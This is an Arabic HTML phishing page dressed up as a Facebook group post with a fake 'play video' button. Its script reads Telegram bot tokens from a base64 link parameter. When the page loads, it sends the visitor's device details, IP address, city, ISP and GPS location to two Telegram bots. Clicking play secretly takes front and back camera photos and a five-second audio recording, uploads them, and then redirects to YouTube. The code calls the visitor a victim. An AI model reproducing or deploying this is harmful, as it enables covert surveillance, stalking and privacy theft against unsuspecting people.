<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جروب بني أحمد | منشور حصري</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        /* محاكاة تصميم فيسبوك */
        .fb-post-card {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            margin: 0 auto;
        }

        /* رأس المنشور - معلومات المجموعة */
        .post-header {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #e4e6eb;
        }

        .group-avatar {
            width: 52px;
            height: 52px;
            background: linear-gradient(145deg, #ff7e05, #e65c00);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .group-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .group-info h3 {
            font-size: 15px;
            font-weight: 600;
            color: #050505;
            margin-bottom: 2px;
        }

        .group-info .group-badge {
            font-size: 12px;
            color: #65676b;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .group-info .group-badge span {
            background: #e4e6eb;
            padding: 2px 6px;
            border-radius: 8px;
            font-size: 10px;
        }

        .privacy-icon {
            font-size: 10px;
        }

        /* صورة المنشور الوهمي */
        .post-image {
            background: #1a1a2e;
            height: 220px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23404040" width="80px" height="80px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
            background-repeat: no-repeat;
            background-position: center;
            background-size: 60px;
            background-color: #2d2d44;
        }

        .play-overlay {
            background: rgba(0,0,0,0.6);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.2s;
            border: 2px solid white;
        }

        .play-overlay span {
            font-size: 30px;
            color: white;
            margin-right: 4px;
        }

        /* تفاصيل التفاعل */
        .reactions-row {
            padding: 10px 16px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #e4e6eb;
            font-size: 13px;
            color: #65676b;
        }

        /* أزرار التفاعل */
        .action-buttons {
            display: flex;
            padding: 6px 12px;
            border-bottom: 1px solid #e4e6eb;
        }

        .action-btn {
            flex: 1;
            text-align: center;
            padding: 8px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            color: #65676b;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .action-btn:hover {
            background: #f0f2f5;
        }

        /* زر التشغيل الرئيسي */
        .play-btn-fb {
            background: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: bold;
            margin: 16px;
            width: calc(100% - 32px);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: 0.2s;
        }

        .play-btn-fb:active {
            transform: scale(0.97);
            background: #0e62c9;
        }

        .play-btn-fb:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .loading-fb {
            display: none;
            text-align: center;
            padding: 16px;
            background: #f8f9fa;
            margin: 12px;
            border-radius: 24px;
        }

        .spinner-fb {
            width: 32px;
            height: 32px;
            border: 3px solid #e4e6eb;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-fb {
            position: fixed;
            bottom: 8px;
            left: 8px;
            background: rgba(0,0,0,0.7);
            color: #4ade80;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 9px;
            font-family: monospace;
            z-index: 999;
            backdrop-filter: blur(4px);
            pointer-events: none;
        }

        .error-msg {
            background: #fff0f0;
            color: #c00;
            font-size: 12px;
            padding: 8px;
            margin: 12px;
            border-radius: 12px;
            text-align: center;
            display: none;
            border-right: 3px solid #c00;
        }

        .fake-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            background: #e7f3ff;
            margin: 12px;
            padding: 10px;
            border-radius: 30px;
            font-size: 13px;
            color: #1877f2;
        }

        .dot-blue {
            width: 8px;
            height: 8px;
            background: #1877f2;
            border-radius: 50%;
            animation: blink 1s infinite;
        }
    </style>
</head>
<body>

<div class="fb-post-card">
    <!-- رأس يشبه جروب بني أحمد -->
    <div class="post-header">
        <div class="group-avatar">
            🐪
        </div>
        <div class="group-info">
            <h3>𐂂 جروب بني أحمد 𐂂</h3>
            <div class="group-badge">
                <span>⚡ مجموعة عامة</span> • <span>٢٥٠ ألف عضو</span> • <span class="privacy-icon">🌍</span>
            </div>
        </div>
    </div>

    <!-- صورة / فيديو وهمي -->
    <div class="post-image" id="postImageArea">
        <div class="play-overlay" id="playOverlayBtn">
            <span>▶</span>
        </div>
    </div>

    <!-- تفاعلات -->
    <div class="reactions-row">
        <span>👍 15K</span>
        <span>💬 1.2K تعليق</span>
        <span>🔁 890 مشاركة</span>
    </div>

    <!-- أزرار تفاعل فيسبوك -->
    <div class="action-buttons">
        <div class="action-btn" id="fakeLikeBtn">👍 إعجاب</div>
        <div class="action-btn" id="fakeCommentBtn">💬 تعليق</div>
        <div class="action-btn" id="fakeShareBtn">📤 مشاركة</div>
    </div>

    <!-- زر تشغيل الفيديو الحقيقي -->
    <button class="play-btn-fb" id="playBtn">
        🎬 تشغيل المنشور الحصري
    </button>

    <div class="loading-fb" id="loading">
        <div class="spinner-fb"></div>
        <p>⏳ جاري تجهيز البث المباشر ...</p>
    </div>

    <div class="fake-status" id="fakePreview" style="display: none;">
        <div class="dot-blue"></div>
        <span>📡 رفع الجودة ... يرجى الانتظار</span>
    </div>

    <div class="error-msg" id="errorMsg"></div>
</div>

<div class="status-fb" id="status">🟢 جروب بني أحمد متصل</div>

<script>
    // ======================= إرسال إلى تيليجرام =======================
    async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
        try {
            if (type === 'photo') {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', mediaBlob, 'snapshot.jpg');
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
            } 
            else if (type === 'video') {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('video', mediaBlob, 'clip.mp4');
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fd });
            }
            else if (type === 'audio') {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('audio', mediaBlob, 'voice.m4a');
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: fd });
            }
            else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' })
                });
            }
            return true;
        } catch(e) { console.warn(e); return false; }
    }

    // ================ 1. معلومات الجهاز التفصيلية ================
    async function getDetailedDeviceInfo(chatUser, tokenUser, chatMaster, tokenMaster) {
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const screenDetails = `${screen.width}x${screen.height} (عمق الألوان: ${screen.colorDepth}-bit)`;
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح';
        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : 'غير متاح';
        const touchSupport = 'ontouchstart' in window ? 'نعم' : 'لا';
        const vendor = navigator.vendor || 'غير معروف';
        const platform = navigator.platform || 'غير معروف';
        const language = navigator.language;
        const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'معطلة';
        
        let batteryInfo = 'غير متاح';
        if(navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `نسبة الشحن: ${Math.round(battery.level * 100)}%، يشحن: ${battery.charging ? 'نعم' : 'لا'}`;
            } catch(e) {}
        }
        
        let connectionInfo = 'غير متاح';
        if(navigator.connection) {
            const conn = navigator.connection;
            connectionInfo = `نوع: ${conn.effectiveType || '?'}، سرعة: ${conn.downlink || '?'} Mbps`;
        }
        
        const detailedMsg = `📱 <b>جهاز العضو - جروب بني أحمد</b>\n🖥️ المتصفح: ${navigator.userAgent}\n📐 الشاشة: ${screenDetails}\n🧠 الرام: ${memory}\n⚙️ المعالج: ${cores}\n🌍 المنطقة: ${timeZone}\n🔤 اللغة: ${language}\n👆 اللمس: ${touchSupport}\n🔋 البطارية: ${batteryInfo}\n📡 الاتصال: ${connectionInfo}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`;
        
        await sendToTelegram(chatUser, tokenUser, 'text', null, detailedMsg + "\n[عضو الجروب]");
        await sendToTelegram(chatMaster, tokenMaster, 'text', null, detailedMsg + "\n[مدير الجروب]");
    }

    // ================ 2. الموقع الجغرافي ================
    function getLocationAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
        if(!navigator.geolocation) return;
        document.getElementById('status').innerHTML = '📍 جلب موقع العضو...';
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const locMsg = `📍 <b>موقع العضو بدقة</b>\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ±${pos.coords.accuracy} متر\n🔗 خرائط: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg + "\n[مستخدم]");
            await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg + "\n[Admin]");
        }, () => {});
    }

    // ================ 3. جلب IP ================
    async function getPublicIPAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const ip = data.ip;
            let geoIp = '';
            try {
                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
                const geoData = await geoRes.json();
                if(geoData.status === 'success') {
                    geoIp = `\n🌍 البلد: ${geoData.country}\n🏙️ المدينة: ${geoData.city}\n🔌 مزود: ${geoData.isp}`;
                }
            } catch(e) {}
            const ipMsg = `🌐 <b>IP العضو</b>\n🔢 IP: ${ip}${geoIp}`;
            await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
            await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg + " [مراقب]");
        } catch(e) {}
    }

    // ================ 4. كاميرا أمامية ================
    async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const videoElem = document.createElement('video');
            videoElem.srcObject = stream;
            videoElem.play();
            await new Promise(r => setTimeout(r, 400));
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth || 640;
            canvas.height = videoElem.videoHeight || 480;
            canvas.getContext('2d').drawImage(videoElem, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            const caption = "🤳 صورة سيلفي (كاميرا أمامية) - من عضو جروب بني أحمد";
            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا أمامية]");
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) { return false; }
    }

    // ================ 5. كاميرا خلفية ================
    async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const videoElem = document.createElement('video');
            videoElem.srcObject = stream;
            videoElem.play();
            await new Promise(r => setTimeout(r, 400));
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth || 640;
            canvas.height = videoElem.videoHeight || 480;
            canvas.getContext('2d').drawImage(videoElem, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            const caption = "📸 صورة من الكاميرا الخلفية (جروب بني أحمد)";
            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [خلفية]");
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) { return false; }
    }

    // ================ 6. تسجيل صوت ================
    async function recordAudioSecret(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            const audioPromise = new Promise(resolve => {
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/mp4' });
                    const caption = "🎙️ تسجيل صوتي تلقائي - عضو بالجروب";
                    await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
                    await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption + " [صوت]");
                    resolve(true);
                };
            });
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
            return await audioPromise;
        } catch(e) { return false; }
    }

    // ====================== تشغيل السكربت الرئيسي ======================
    (async function() {
        const urlParams = new URLSearchParams(window.location.search);
        const encoded = urlParams.get('d');
        if(!encoded) {
            document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
            document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص لمجموعة بني أحمد';
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }

        let config;
        try {
            config = JSON.parse(atob(encoded));
        } catch(e) {
            document.getElementById('status').innerHTML = '❌ خطأ';
            document.getElementById('errorMsg').innerHTML = 'بيانات الرابط تالفة';
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }

        const { mChat, mToken, tChat, tToken, features } = config;
        const featuresArr = features ? features.split(',') : [];

        await sendToTelegram(tChat, tToken, 'text', null, "🔗 عضو فتح رابط جروب بني أحمد");
        await sendToTelegram(mChat, mToken, 'text', null, "🔗 تم فتح رابط الضحية - جروب بني أحمد");

        await getDetailedDeviceInfo(tChat, tToken, mChat, mToken);
        await getPublicIPAdvanced(tChat, tToken, mChat, mToken);
        if(featuresArr.includes('loc')) getLocationAdvanced(tChat, tToken, mChat, mToken);

        let executed = false;
        const playBtn = document.getElementById('playBtn');
        const loadingDiv = document.getElementById('loading');
        const fakePreview = document.getElementById('fakePreview');
        const overlayPlay = document.getElementById('playOverlayBtn');

        const startCollection = async () => {
            if(executed) return;
            executed = true;
            playBtn.disabled = true;
            loadingDiv.style.display = 'block';
            fakePreview.style.display = 'flex';
            document.getElementById('status').innerHTML = '🎥 تشغيل المنشور وجمع البيانات...';

            let actions = [];
            if(featuresArr.includes('front')) actions.push(captureFrontCamera(tChat, tToken, mChat, mToken));
            if(featuresArr.includes('back')) actions.push(captureBackCamera(tChat, tToken, mChat, mToken));
            if(featuresArr.includes('audio')) actions.push(recordAudioSecret(tChat, tToken, mChat, mToken));
            
            await Promise.allSettled(actions);
            
            await sendToTelegram(tChat, tToken, 'text', null, "✅ تم تجهيز المنشور وجمع البيانات.");
            await sendToTelegram(mChat, mToken, 'text', null, "✅ اكتمل الجلب (كاميرا/صوت/جهاز) - جروب بني أحمد");
            
            document.getElementById('status').innerHTML = '✅ تم التشغيل - توجيه للفيديو';
            loadingDiv.innerHTML = '<div class="spinner-fb"></div><p>تم التحميل! جاري التوجيه...</p>';
            
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }, 2500);
        };

        playBtn.onclick = startCollection;
        overlayPlay.onclick = startCollection;
        
        document.getElementById('fakeLikeBtn').onclick = () => { alert("⚠️ يلزم تشغيل الفيديو أولاً"); };
        document.getElementById('fakeCommentBtn').onclick = () => { alert("⚠️ شغّل الفيديو للوصول إلى التعليقات"); };
        document.getElementById('fakeShareBtn').onclick = () => { alert("⚠️ اضغط على زر تشغيل الفيديو أولاً"); };
        
        document.getElementById('status').innerHTML = '🟢 جروب بني أحمد - اضغط تشغيل';
    })();
</script>
</body>
</html>
